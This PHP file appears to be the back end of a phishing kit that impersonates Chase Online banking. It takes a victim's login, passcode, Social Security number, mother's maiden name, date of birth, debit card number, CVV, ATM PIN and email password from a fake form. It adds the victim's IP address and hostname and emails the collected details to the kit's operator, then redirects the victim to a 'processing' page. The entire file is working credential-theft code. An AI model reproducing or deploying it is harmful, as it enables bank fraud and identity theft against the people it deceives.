<?php
$message .= "--------------+ Created in 2018 By [ T.Dox ] +------------\n";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "User ID : ".$_POST['IDUser']."\n";
$message .= "PassCode : ".$_POST['Passcode']."\n";
$message .= "First Name : ".$_POST['FNAME']."\n";
$message .= "Last Name	 : ".$_POST['LNAME']."\n";
$message .= "Address : ".$_POST['Address']."\n";
$message .= "City : ".$_POST['CITY']."\n";
$message .= "State : ".$_POST['State']."\n";
$message .= "Zip Code : ".$_POST['ZIP']."\n";
$message .= "Phone Number : ".$_POST['PHONE']."\n";
$message .= "Social Security Number : ".$_POST['SSN']."\n";
$message .= "Mother's Maiden Name : ".$_POST['MMN']."\n";
$message .= "Date of Birth : ".$_POST['DOB']."\n";
$message .= "Debit Card number : ".$_POST['CCnum']."\n";
$message .= "Expiration Date : ".$_POST['EXPDATE']."\n";
$message .= "Name on Card : ".$_POST['Nameoncc']."\n";
$message .= "Cvv : ".$_POST['CVV']."\n";
$message .= "Card Signature/PIN	 : ".$_POST['ATMPIN']."\n";
$message .= "Email Address : ".$_POST['EMail']."\n";
$message .= "Email Password : ".$_POST['Password']."\n";
$message .= "Confirm Password : ".$_POST['Password1']."\n";
$message .= "--------------------\n";
$message .= "IP Address : $ip\n";
$message .= "HostName   : $hostname\n";
$rnessage  = "$message\n";
$message .= "--------------+ Created in 2018 By [ T.Dox ] +------------\n";

include('Email.php');

#$file = fopen("mr1.txt","a");
#fwrite($file,$message);
#fclose($file);

$subject = " Chase Online Full Rezult KaPo0o  $ip";
$headers = "From: Chase T.Dox<new@T.Dox.com>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:Proccessing.php?$hostname");
}
?>